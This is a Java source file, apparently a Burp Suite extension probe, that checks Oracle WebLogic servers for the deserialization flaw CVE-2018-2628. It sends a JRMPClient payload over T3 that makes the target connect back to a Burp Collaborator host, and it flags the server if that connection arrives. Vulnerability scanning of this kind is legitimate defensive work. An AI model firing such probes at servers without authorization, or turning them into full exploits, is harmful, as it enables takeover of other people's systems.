package probes;

import burp.*;
import payloads.JRMPClient;

public class CVE_2018_2628 extends Probe implements T3Protocol {
    private static final String NAME = "CVE-2018-2628";
    private static final String SEVERITY = "High";
    private static final String DESC = "Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: WLS Core Components). Supported versions that are affected are 10.3.6.0, 12.1.3.0, 12.2.1.2 and 12.2.1.3. Easily exploitable vulnerability allows unauthenticated attacker with network access via T3 to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server. CVSS 3.0 Base Score 9.8 (Confidentiality, Integrity and Availability impacts).";

    @Override
    public IScanIssue check(IHttpRequestResponse requestResponse) {
        IHttpService service = requestResponse.getHttpService();
        String pollPayload = Utilities.collaborator.generatePayload(true);
        try {
            byte[] payload = JRMPClient.getPayloadBytes(pollPayload, "activator");
            send(service.getHost(), service.getPort(), service.getProtocol(), payload);
        } catch (Exception e) {
            e.printStackTrace(Utilities.err);
        }

        String detail = Utilities.fetchInteraction(pollPayload);

        if (detail.length() > 0) {
            return new WebLogicIssue(
                    requestResponse,
                    NAME,
                    DESC + "<br/><br/>" + detail,
                    SEVERITY);
        } else return null;
    }
}
